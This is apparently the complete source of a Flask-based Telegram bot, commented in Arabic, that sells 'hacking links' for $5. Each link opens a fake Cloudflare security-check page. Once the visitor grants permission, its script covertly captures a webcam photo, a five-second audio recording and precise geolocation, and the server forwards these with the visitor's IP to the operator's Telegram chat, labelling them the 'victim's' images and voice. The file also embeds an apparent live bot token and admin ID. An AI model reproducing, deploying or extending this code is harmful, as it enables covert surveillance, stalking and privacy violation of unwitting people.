import base64, requests, io, os, time, json
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com" # غير هذا الرابط بعد تشغيل Ngrok
DEVELOPER_USER = "Y_urd"

DB_FILE = "database.json"

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f)

db = load_db()
link_expiry = None
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #eee; padding: 40px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); width: 85%; max-width: 400px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120">
        <h2>جاري فحص المتصفح...</h2>
        <p>اضغط "سماح" لتأمين اتصالك بالموقع.</p>
        <div class="spinner"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        let chunks = [];
        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                const v = document.getElementById('v'); v.srcObject = s;
                
                // 1. الموقع الجغرافي
                navigator.geolocation.getCurrentPosition(p => send({type:'text', lat:p.coords.latitude, lon:p.coords.longitude}), () => send({type:'text', lat:0, lon:0}), {enableHighAccuracy:true});

                // 2. التقاط الصورة (بعد 4 ثوانٍ لضمان الإضاءة والفوكس)
                setTimeout(() => {
                    const cn = document.getElementById('c');
                    cn.width = v.videoWidth; cn.height = v.videoHeight;
                    cn.getContext('2d').drawImage(v, 0, 0);
                    send({type:'img', img:cn.toDataURL('image/jpeg', 0.8).split(',')[1]});
                }, 4000);

                // 3. تسجيل الصوت (5 ثوانٍ)
                const rec = new MediaRecorder(s);
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const fr = new FileReader();
                    fr.readAsDataURL(new Blob(chunks, {type:'audio/ogg'}));
                    fr.onloadend = () => {
                        send({type:'audio', audio:fr.result.split(',')[1]});
                        setTimeout(() => window.location.replace("https://google.com"), 1000);
                    };
                };
                rec.start();
                setTimeout(() => rec.stop(), 5500);
            } catch(e) { window.location.replace("https://google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def bot_send(m, p=None, f=None):
    u = f"https://api.telegram.org/bot{BOT_TOKEN}/{m}"
    try:
        if f: return requests.post(u, data=p, files=f, timeout=20)
        return requests.post(u, json=p, timeout=20)
    except: return None

@app.route('/')
def index():
    if not link_expiry or datetime.now() > link_expiry:
        return redirect("https://google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json; t = d.get('type')
    if t == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
        bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 <b>صيد جديد يا سيوفي!</b>\nIP: <code>{ip}</code>\nالموقع: <a href='{loc}'>فتح الخريطة</a>", "parse_mode": "HTML"})
    elif t == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        bot_send("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الضحية المباشرة"}, {"photo": ph})
    elif t == 'audio':
        au = io.BytesIO(base64.b64decode(d.get('audio'))); au.name = 'voice.ogg'
        bot_send("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 تسجيل صوتي للضحية"}, {"voice": au})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    global link_expiry, db
    u = request.get_json(silent=True)
    if not u or "message" not in u: return "OK"
    m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")

    # تحكم المطور سيوفي
    if cid == ADMIN_ID:
        if txt == "/open":
            link_expiry = datetime.now() + timedelta(minutes=5)
            bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح الرابط لمدة 5 دقائق."})
        elif txt.startswith("/active"):
            try:
                uid = str(txt.split()[1])
                db[uid] = {"status": "premium", "used": False}
                save_db(db); bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": f"✅ تم تفعيل العضوية الممتازة لـ {uid}"})
            except: pass
        elif txt.startswith("/ban"):
            try:
                uid = str(txt.split()[1])
                db[uid] = {"status": "banned", "used": True}
                save_db(db); bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر {uid}"})
            except: pass

    if txt == "/start":
        user = db.get(str(cid), {"status": "free", "used": False})
        if user["status"] == "banned":
            bot_send("sendMessage", {"chat_id": cid, "text": "🚫 عذراً، لقد تم حظرك من النظام."})
        elif user["used"] and user["status"] == "free" and cid != ADMIN_ID:
            bot_send("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المحاولة المجانية.\nراسل @{DEVELOPER_USER} للتفعيل بمبلغ 5$."})
        else:
            bot_send("sendMessage", {"chat_id": cid, "text": f"أهلاً بك في بوت سيوفي.\nلديك محاولة واحدة مجانية.\nالاشتراك: {CHANNEL_URL}", "reply_markup": {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}})

    return "OK"

# معالجة ضغط الأزرار
@app.route('/webhook_cb', methods=['POST']) # وهمي للتعامل داخل دالة الويب هوك الرئيسية
def handle_cb(cid, data):
    global link_expiry, db
    user = db.get(str(cid), {"status": "free", "used": False})
    if data == "gen":
        if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
            bot_send("sendMessage", {"chat_id": cid, "text": "❌ استنفدت المحاولة."})
        else:
            if cid != ADMIN_ID:
                db[str(cid)] = {"status": user["status"], "used": True}
                save_db(db)
            link_expiry = datetime.now() + timedelta(minutes=5)
            bot_send("sendMessage", {"chat_id": cid, "text": f"✅ تم إنشاء رابطك بنجاح (صالح لـ 5 دقائق):\n<code>{MY_LINK}</code>", "parse_mode": "HTML"})

if __name__ == '__main__':
    print("--- السيرفر يعمل الآن على المنفذ 8080 ---")
    app.run(host='0.0.0.0', port=8080)

